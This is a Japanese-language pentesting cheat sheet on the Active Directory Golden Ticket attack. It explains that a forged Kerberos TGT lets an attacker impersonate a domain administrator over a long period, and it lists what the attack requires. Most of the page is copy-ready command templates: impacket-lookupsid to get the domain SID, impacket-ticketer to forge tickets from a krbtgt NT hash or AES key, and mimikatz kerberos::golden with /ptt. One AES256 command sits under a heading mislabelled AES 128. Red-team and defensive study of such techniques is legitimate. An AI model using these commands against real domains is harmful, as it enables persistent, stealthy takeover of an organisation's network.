# Golden Tickets攻撃

`Golden Ticket` とは、Active Directory認証において攻撃者が作成したTGT(Ticket Granting Ticket)を指す。攻撃者は有効期限が長いTGTを作成し正規のドメイン管理者に長期的になりすますことを目的としている。Golden Ticketを悪用する攻撃は [Pass-the-Ticket攻撃](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Movement/Kerberos/Pass%20The%20Ticket.md)の一種。

## 攻撃に必要なもの

ゴールデンチケットを作成するために、テスターは`krbtgt` のRC4キー（NTハッシュ）またはAESキー（128ビットまたは256ビット）を見つける必要がある。ほとんどの場合、これはDCSync攻撃を通してドメイン管理者権限でのみ達成可能。このため、ゴールデンチケットは横方向の移動のみを可能にし、特権の昇格はできない。

- krbtgtのRC4 key(NTLM hash) or AES key

- DOMAINのSID

  ```
  impacket-lookupsid -hashes 'LMhash:NThash' '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'
  ```

## チケットの取得

### Linux

with an NT hash

```
impacket-ticketer -nthash <Krbtgt_NTLM> -domain_sid <DOMAIN_SID> -domain <DOMAIN> stegosaurus
```

with an AES (128 or 256 bits) key

```
# AES 128/256bits key
impacket-ticketer -aesKey <Krbtgt_Aeskey> -domain_sid <DOMAIN_SID> -domain <DOMAIN> stegosaurus
```

カスタムユーザー/グループIDでゴールデンチケットRC4キー(NTLMハッシュ)を作成する

```
impacket-ticketer -nthash <Krbtgt_NTLM> -domain_sid <DOMAIN_SID> -domain <DOMAIN> -user-id <USER_RID> -groups "<Groupid1>,<Groupid2>,..." stegosaurus
```

### Windows

with an NT hash

```
kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /rc4:<krbtgt_NThash> /user:Administrator /ptt
```

with an AES 128 key

```
kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /aes128:<krbtgt_aes128_key> /user:Administrator /ptt
```

with an AES 128 key

```
kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /aes256:<krbtgt_aes256_key> /user:Administrator /ptt
```